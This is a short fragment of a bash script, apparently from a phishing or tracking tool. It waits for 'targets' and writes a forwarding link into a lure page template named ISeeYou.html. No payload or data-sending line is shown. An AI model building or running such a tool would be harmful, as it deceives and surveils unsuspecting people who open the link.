...
printf "\n"
printf "\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m] Waiting targets,\e[0m\e[1;93m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do
...
sed 's+forwarding_link+'$link'+g' ISeeYou.html > index2.html
...
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;93m pkg install wget\e[0m\n"
exit 1
fi
...
sed 's+forwarding_link+'$send_link'+g' ISeeYou.html > index2.html
